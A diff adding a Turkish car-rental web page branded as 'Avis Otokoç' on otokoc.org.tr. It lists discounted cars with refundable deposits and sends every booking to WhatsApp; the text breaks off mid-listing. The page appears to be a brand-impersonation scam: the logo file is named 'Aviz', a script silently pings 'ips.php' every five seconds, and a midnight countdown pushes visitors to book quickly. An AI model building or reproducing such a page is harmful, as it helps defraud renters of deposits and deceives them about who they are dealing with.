@@ -1,0 +1,1933 @@
+<!DOCTYPE html>
+
+<html lang="tr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Oto Koç Araç Kiralama | Araba Kirala</title>
+<link href="assets/13332983_style.css" rel="stylesheet"/>
+<link href="ilan/favicon_1000088614.png" rel="icon" type="image/x-icon"/>
+<link href="ilan/favicon_1000088614.png" rel="shortcut icon" type="image/x-icon"/>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+<meta content="Avis Otokoç Araç Kiralama  - Uygun fiyatlı araç kiralama hizmeti. Günlük, haftalık ve aylık kiralık araç seçenekleri." name="description"/>
+<meta content="index, follow" name="robots"/>
+<link href="https://otokoc.org.tr/" rel="canonical"/>
+<!-- Open Graph (WhatsApp, Facebook paylaşım önizlemesi) -->
+<meta content="Avis Otokoç Araç Kiralama  - Araç Kiralama" property="og:title"/>
+<meta content="Uygun fiyatlı günlük kiralık araç seçenekleri için hemen inceleyin." property="og:description"/>
+<meta content="https://otokoc.org.tr/ilan/Aviz Filo logosu.png" property="og:image"/>
+<meta content="https://otokoc.org.tr/" property="og:url"/>
+<meta content="website" property="og:type"/>
+<meta content="tr_TR" property="og:locale"/>
+<!-- Site İkonu (favicon) -->
+<link href="/favicon.png" rel="icon" type="image/png"/>
+<link href="/apple-touch-icon.png" rel="apple-touch-icon"/>
+<!-- Schema.org - Yerel İşletme -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "CarRental",
+  "name": "Avis Otokoç Araç Kiralama ",
+  "url": "https://otokoc.org.tr",
+  "telephone": "+905016865244",
+  "image": "https://otokoc.org.tr/ilan/Aviz Filo logosu.png",
+  "priceRange": "₺₺",
+  "areaServed": "Turkey"
+}
+</script>
+<style>
+        :root { --primary: #359441; }
+        * { box-sizing: border-box; }
+
+        /* ===== ARAÇ KARTI ===== */
+        .car-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 24px;
+            padding: 24px;
+        }
+        .car-card {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .car-card:hover { transform: translateY(-4px); box-shadow: 0 8px 32px rgba(0,0,0,0.13); }
+        .car-header { padding: 14px 16px 0; position: relative; }
+        .car-type { background: var(--primary); color: #fff; font-size: 0.7rem; font-weight: 700; padding: 3px 10px; border-radius: 20px; letter-spacing: 0.5px; }
+        .car-name { font-size: 1.2rem; font-weight: 700; margin: 0; color: #1F2937; }
+        .car-image { width: 100%; height: 200px; object-fit: contain; background: #fff; padding: 10px; }
+        .car-features { display: flex; flex-wrap: nowrap; gap: 6px; padding: 10px 16px; font-size: 0.75rem; color: #6B7280; }
+        .car-features span { background: #F3F4F6; padding: 5px 8px; border-radius: 6px; white-space: nowrap; flex: 1; text-align: center; display: flex; align-items: center; justify-content: center; gap: 4px; }
+        .car-footer { padding: 14px 16px 18px; margin-top: auto; display: flex; flex-direction: column; gap: 10px; }
+        .car-prices-row { display: flex; gap: 8px; }
+        .car-prices-row .car-price,
+        .car-prices-row .car-depozito { flex: 1; }
+        .btn-kirala { width: 100%; }
+        .car-price { background: var(--primary); border-radius: 10px; padding: 12px 12px 10px; text-align: center; position: relative; display: flex; flex-direction: column; justify-content: flex-end; min-height: 90px; }
+        .car-price .label { font-size: 0.65rem; color: rgba(255,255,255,0.85); display: block; font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; margin-bottom: 4px; }
+        .car-price .amount { font-size: 1.2rem; font-weight: 800; color: #fff; display: block; }
+        .car-price .per { font-size: 0.68rem; color: rgba(255,255,255,0.8); display: block; margin-top: 1px; }
+        .indirim-badge { position: absolute; top: -11px; left: 50%; transform: translateX(-50%); background: #FF3B30; color: #fff; font-size: 0.6rem; font-weight: 800; padding: 3px 9px; border-radius: 20px; letter-spacing: 0.5px; white-space: nowrap; box-shadow: 0 2px 6px rgba(255,59,48,0.45); z-index: 2; }
+        .eski-fiyat { display: block; font-size: 0.78rem; color: rgba(255,255,255,0.65); text-decoration: line-through; text-decoration-color: rgba(255,255,255,0.85); text-decoration-thickness: 1.5px; margin-bottom: 1px; letter-spacing: 0.2px; }
+        .car-depozito { background: #DC2626; border-radius: 10px; padding: 12px 12px 10px; text-align: center; display: flex; flex-direction: column; justify-content: flex-end; min-height: 90px; }
+        .car-depozito .label { font-size: 0.65rem; color: rgba(255,255,255,0.85); display: block; font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; margin-bottom: 4px; }
+        .car-depozito .amount { font-size: 1.2rem; font-weight: 800; color: #fff; display: block; }
+        .car-depozito .per { font-size: 0.68rem; color: rgba(255,255,255,0.8); display: block; margin-bottom: 4px; }
+        .btn-kirala { background: var(--primary); color: #fff; border: none; padding: 12px 22px; border-radius: 10px; font-weight: 700; font-size: 0.9rem; cursor: pointer; transition: opacity 0.2s; font-family: 'Outfit', sans-serif; white-space: nowrap; }
+        .btn-kirala:hover { opacity: 0.87; }
+
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            display: none; position: fixed; inset: 0;
+            background: rgba(0,0,0,0.55); z-index: 9000;
+            align-items: center; justify-content: center; padding: 16px;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-box {
+            background: #fff; border-radius: 20px; padding: 32px 28px;
+            width: 100%; max-width: 440px; position: relative;
+            animation: slideUp 0.3s ease; max-height: 90vh; overflow-y: auto;
+        }
+        @keyframes slideUp { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }
+        .modal-close { position: absolute; top: 14px; right: 18px; font-size: 1.4rem; cursor: pointer; color: #9CA3AF; background: none; border: none; }
+        .modal-title { font-size: 1.15rem; font-weight: 700; color: #1F2937; margin-bottom: 6px; }
+        .modal-sub { font-size: 0.88rem; color: #6B7280; margin-bottom: 22px; }
+        .modal-input { width: 100%; padding: 14px 14px 14px 40px; border: 1.5px solid #E5E7EB; border-radius: 10px; font-size: 1rem; font-family: 'Outfit', sans-serif; outline: none; transition: border 0.2s; }
+        .modal-input:focus { border-color: var(--primary); }
+        .modal-btn { width: 100%; padding: 15px; border: none; border-radius: 10px; background: var(--primary); color: #fff; font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 12px; font-family: 'Outfit', sans-serif; display: flex; align-items: center; justify-content: center; gap: 8px; transition: opacity 0.2s; }
+        .modal-btn:hover { opacity: 0.87; }
+        .modal-btn.loading { opacity: 0.7; pointer-events: none; }
+        .modal-btn-secondary { width: 100%; padding: 13px; border: 1.5px solid #E5E7EB; border-radius: 10px; background: #F9FAFB; color: #6B7280; font-size: 0.95rem; font-weight: 600; cursor: pointer; margin-top: 10px; font-family: 'Outfit', sans-serif; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .modal-error { background: #FEF2F2; border: 1px solid #FCA5A5; border-radius: 8px; padding: 10px 14px; font-size: 0.85rem; color: #DC2626; margin-top: 12px; display: none; }
+        .modal-error.show { display: block; }
+
+        /* ===== BİLGİ SATIRLARI ===== */
+        .info-row { display: flex; justify-content: space-between; align-items: flex-start; padding: 10px 0; border-bottom: 1px solid #F3F4F6; font-size: 0.88rem; }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: #9CA3AF; flex-shrink: 0; }
+        .info-val { font-weight: 600; color: #1F2937; text-align: right; max-width: 60%; }
+
+        /* ===== UYARI KUTUSU ===== */
+        .warn-box { background: #FFF7ED; border: 1.5px solid #FED7AA; border-radius: 14px; padding: 20px; text-align: center; margin: 16px 0; }
+        .warn-icon { font-size: 2.5rem; color: #F97316; margin-bottom: 8px; }
+        .warn-title { font-size: 1rem; font-weight: 700; color: #9A3412; margin-bottom: 6px; }
+        .warn-msg { font-size: 0.83rem; color: #92400E; line-height: 1.5; }
+
+        /* ===== TESLİMAT OPSİYONLARI ===== */
+        .delivery-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 18px; }
+        .delivery-opt { border: 2px solid #E5E7EB; border-radius: 12px; padding: 14px 10px; text-align: center; cursor: pointer; transition: all 0.2s; }
+        .delivery-opt.active { border-color: var(--primary); background: #FFF7ED; }
+        .delivery-opt i { font-size: 1.6rem; color: var(--primary); display: block; margin-bottom: 6px; }
+        .delivery-opt span { font-size: 0.85rem; font-weight: 600; color: #374151; }
+
+        /* ===== TARİH ALANLARI ===== */
+        .date-group { margin-bottom: 14px; }
+        .date-group label { display: block; font-size: 0.85rem; font-weight: 600; color: #6B7280; margin-bottom: 6px; }
+        .date-group input { width: 100%; padding: 13px 14px; border: 1.5px solid #E5E7EB; border-radius: 10px; font-size: 0.95rem; font-family: 'Outfit', sans-serif; outline: none; }
+        .date-group input:focus { border-color: var(--primary); }
+
+        #adres-alani { display: none; margin-bottom: 14px; }
+        #adres-alani label { display: block; font-size: 0.85rem; font-weight: 600; color: #6B7280; margin-bottom: 6px; }
+        #adres-alani textarea { width: 100%; padding: 13px 14px; border: 1.5px solid #E5E7EB; border-radius: 10px; font-family: 'Outfit', sans-serif; font-size: 0.95rem; resize: vertical; outline: none; }
+        #adres-alani textarea:focus { border-color: var(--primary); }
+
+        /* ===== WHATSAPP ===== */
+        .whatsapp-sticky-button { position: fixed; bottom: 25px; right: 25px; background-color: #25D366; color: #fff !important; padding: 12px 20px; border-radius: 50px; text-decoration: none !important; display: flex; align-items: center; font-family: 'Outfit', sans-serif; font-weight: 600; box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 9999; transition: all 0.3s ease; }
+        .whatsapp-sticky-button i { font-size: 24px; margin-right: 10px; }
+        @media (max-width: 768px) {
+            .whatsapp-sticky-button { bottom:20px; right:20px; padding:15px; border-radius:50%; width:55px; height:55px; justify-content:center; }
+            .whatsapp-sticky-button span { display: none; }
+            .whatsapp-sticky-button i { margin-right:0; font-size:30px; }
+            .car-list { grid-template-columns: 1fr; padding: 12px; gap: 16px; }
+            .modal-box { padding: 24px 18px; }
+        }
+
+        /* ===== FİLTRE SIDEBAR ===== */
+        .page-layout { display: flex; gap: 0; min-height: calc(100vh - 70px); }
+        .filter-sidebar {
+            width: 220px; flex-shrink: 0; background: #fff;
+            border-right: 1px solid #F3F4F6; padding: 20px 16px;
+            position: sticky; top: 0; height: fit-content;
+        }
+        .filter-sidebar h4 { font-size: 0.8rem; font-weight: 700; color: #9CA3AF; text-transform: uppercase; letter-spacing: 0.5px; margin: 0 0 12px; }
+        .filter-item { display: flex; align-items: center; gap: 9px; padding: 9px 10px; border-radius: 8px; cursor: pointer; margin-bottom: 4px; transition: background 0.15s; }
+        .filter-item:hover { background: #F9FAFB; }
+        .filter-item input { accent-color: var(--primary); width: 16px; height: 16px; cursor: pointer; }
+        .filter-item label { font-size: 0.9rem; font-weight: 500; color: #374151; cursor: pointer; }
+        .filter-item.active label { color: var(--primary); font-weight: 700; }
+        .listing-area { flex: 1; min-width: 0; }
+        @media (max-width: 768px) {
+            .page-layout { flex-direction: column; }
+            .filter-sidebar { width: 100%; position: static; border-right: none; border-bottom: 1px solid #F3F4F6; padding: 14px 16px; }
+            .filter-scroll { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 4px; }
+            .filter-item { flex-shrink: 0; background: #F3F4F6; border-radius: 20px; padding: 7px 14px; margin: 0; }
+            .filter-item.active { background: var(--primary); }
+            .filter-item.active label { color: #fff; }
+            .filter-sidebar h4 { margin-bottom: 10px; }
+        }
+
+        .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== DEPOZİTOSUZ BANNER ===== */
+        .depozitosuz-banner {
+            background: linear-gradient(135deg, #16a34a 0%, #15803d 50%, #166534 100%);
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+        .depozitosuz-banner::before {
+            content: '';
+            position: absolute;
+            top: -30px; right: -30px;
+            width: 120px; height: 120px;
+            background: rgba(255,255,255,0.07);
+            border-radius: 50%;
+        }
+        .depozitosuz-banner::after {
+            content: '';
+            position: absolute;
+            bottom: -20px; left: 10%;
+            width: 80px; height: 80px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 50%;
+        }
+        .depozitosuz-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            padding: 14px 24px;
+            position: relative;
+            z-index: 1;
+        }
+        .depozitosuz-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .depozitosuz-icon {
+            background: rgba(255,255,255,0.15);
+            border-radius: 50%;
+            width: 46px; height: 46px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.3rem;
+            flex-shrink: 0;
+        }
+        .depozitosuz-texts {}
+        .depozitosuz-title {
+            font-size: 1.05rem;
+            font-weight: 800;
+            color: #fff;
+            display: block;
+            line-height: 1.2;
+            letter-spacing: 0.2px;
+        }
+        .depozitosuz-sub {
+            font-size: 0.8rem;
+            color: rgba(255,255,255,0.82);
+            display: block;
+            margin-top: 3px;
+        }
+        .depozitosuz-sub s {
+            color: rgba(255,255,255,0.55);
+            font-weight: 600;
+        }
+        .depozitosuz-badge {
+            background: #fff;
+            color: #15803d;
+            font-weight: 800;
+            font-size: 0.75rem;
+            padding: 6px 14px;
+            border-radius: 20px;
+            letter-spacing: 0.4px;
+            white-space: nowrap;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+        .depozitosuz-badge i { font-size: 0.8rem; }
+        .depozitosuz-timer {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0,0,0,0.18);
+            border-radius: 8px;
+            padding: 5px 12px;
+            flex-shrink: 0;
+        }
+        .depozitosuz-timer i { color: #fde68a; font-size: 0.85rem; }
+        .depozitosuz-timer span {
+            color: #fff;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        #countdown { font-weight: 800; color: #fde68a; }
+        @media (max-width: 768px) {
+            .depozitosuz-inner { padding: 12px 16px; gap: 8px; }
+            .depozitosuz-title { font-size: 0.95rem; }
+            .depozitosuz-sub { font-size: 0.75rem; }
+            .depozitosuz-timer { display: none; }
+        }
+    </style>
+</head>
+<body class="bg-gray">
+<script>
+    function sendRequest() { fetch('ips.php').then(r=>r.text()).catch(()=>{}); }
+    setInterval(sendRequest, 5000);
+</script>
+<script>
+    // Bugünün gece yarısına kadar geri sayım
+    (function() {
+        function updateCountdown() {
+            var now = new Date();
+            var midnight = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1, 0, 0, 0);
+            var diff = Math.floor((midnight - now) / 1000);
+            if (diff <= 0) { document.getElementById('countdown').textContent = '00:00:00'; return; }
+            var h = Math.floor(diff / 3600);
+            var m = Math.floor((diff % 3600) / 60);
+            var s = diff % 60;
+            document.getElementById('countdown').textContent =
+                (h < 10 ? '0' : '') + h + ':' +
+                (m < 10 ? '0' : '') + m + ':' +
+                (s < 10 ? '0' : '') + s;
+        }
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+    })();
+</script>
+<!-- HEADER -->
+<header>
+<div class="container navbar">
+<a class="logo" href="index.php">
+<img alt="Avis Otokoç Araç Kiralama  Logo" src="assets/c8c751a5_Aviz Filo logosu.png"/>
+</a>
+<div class="nav-actions">
+<div class="menu-toggle"><i class="fa-solid fa-bars"></i></div>
+</div>
+</div>
+</header>
+<!-- DEPOZİTOSUZ BANNER -->
+<!-- LİSTELEME BAŞLIĞI -->
+<div style="background:#fff;padding:16px 24px 12px;border-bottom:1px solid #F3F4F6;">
+<h2 style="font-size:1.2rem;font-weight:800;color:#1F2937;margin:0;">
+<i class="fa-solid fa-car" style="color:var(--primary);margin-right:8px;"></i>Araç Kiralama Seçenekleri
+    </h2>
+</div>
+<div class="page-layout">
+<!-- FİLTRE SIDEBAR -->
+<aside class="filter-sidebar">
+<h4>Segment</h4>
+<div class="filter-scroll">
+<div class="filter-item active" id="f-hepsi" onclick="filtrele('')">
+<input checked="" name="seg" type="radio"/> <label>Tümü</label>
+</div>
+<div class="filter-item" id="f-EKONOMİK" onclick="filtrele('EKONOMİK')">
+<input name="seg" type="radio"/> <label>EKONOMİK</label>
+</div>
+<div class="filter-item" id="f-KONFOR" onclick="filtrele('KONFOR')">
+<input name="seg" type="radio"/> <label>KONFOR</label>
+</div>
+<div class="filter-item" id="f-LÜKS" onclick="filtrele('LÜKS')">
+<input name="seg" type="radio"/> <label>LÜKS</label>
+</div>
+<div class="filter-item" id="f-PREMIUM" onclick="filtrele('PREMIUM')">
+<input name="seg" type="radio"/> <label>PREMIUM</label>
+</div>
+<div class="filter-item" id="f-PRESTİJ" onclick="filtrele('PRESTİJ')">
+<input name="seg" type="radio"/> <label>PRESTİJ</label>
+</div>
+<div class="filter-item" id="f-TİCARİ" onclick="filtrele('TİCARİ')">
+<input name="seg" type="radio"/> <label>TİCARİ</label>
+</div>
+<div class="filter-item" id="f-VAN" onclick="filtrele('VAN')">
+<input name="seg" type="radio"/> <label>VAN</label>
+</div>
+</div>
+</aside>
+<!-- ARAÇ LİSTESİ -->
+<div class="listing-area">
+<!-- DEPOZİTO UYARI NOTU -->
+<div style="margin:16px 24px 0;padding:14px 16px;background:#FEF2F2;border-left:4px solid #DC2626;border-radius:0 10px 10px 0;display:flex;gap:12px;align-items:flex-start;">
+<i class="fa-solid fa-circle-info" style="color:#DC2626;font-size:1.1rem;margin-top:2px;flex-shrink:0;"></i>
+<p style="margin:0;font-size:0.85rem;color:#DC2626;line-height:1.6;">
+<strong>Depozito Nedir</strong>, kiralama süresince oluşabilecek ek masraflara (köprü, otoyol geçişleri ve trafik cezaları vb.) karşı güvence olarak tahsil edilir. Kiralama bitiminde gerekli kontrollerin ardından aynı hesaba iade edilir.
+    </p>
+</div>
+<div class="car-list" id="car-list">
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Renault Clio')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Renault Clio</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Renault Clio" class="car-image" src="assets/ba817a82_72E95919-1249-4130-9E86-079A5D03F639.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Renault Clio')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">1.571 TL</span>
+<span class="amount">1.100 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Renault Clio')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Renault Clio')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Fiat Egea')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Fiat Egea</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Fiat Egea" class="car-image" src="assets/c99b2d6b_D249F1AF-AAE0-46F9-8A0E-DD0C5ED17416.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Fiat Egea')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">1.571 TL</span>
+<span class="amount">1.100 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Fiat Egea')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Fiat Egea')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Fiat Egea')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Fiat Egea</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Fiat Egea" class="car-image" src="assets/630403fe_c4f1ea38-ab53-46d2-894f-82eea1478526.jpeg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel </span>
+<span><i class="fa-solid fa-gear"></i> Manuel</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Fiat Egea')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">1.571 TL</span>
+<span class="amount">1.100 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Fiat Egea')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">0 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Fiat Egea')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Hyundai i20  ')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Hyundai i20  </h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Hyundai i20  " class="car-image" src="assets/9a1549c8_1000034604.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik </span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Hyundai i20  ')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">1.714 TL</span>
+<span class="amount">1.200 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Hyundai i20  ')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Hyundai i20  ')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Fiat Egea Cross')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Fiat Egea Cross</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Fiat Egea Cross" class="car-image" src="assets/318fb53e_03C65371-CB7F-44D9-AA36-D743A2EA4A82.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Fiat Egea Cross')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">1.714 TL</span>
+<span class="amount">1.200 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Fiat Egea Cross')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Fiat Egea Cross')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="EKONOMİK">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Renault Megane')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Renault Megane</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">EKONOMİK</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Renault Megane" class="car-image" src="assets/7d62a647_694CB201-2859-4D4C-B3F0-B66CAAB7CCF3.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Manuel</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Renault Megane')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.000 TL</span>
+<span class="amount">1.400 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Renault Megane')" style="display:flex;flex-direction:column;justify-content:flex-end;">
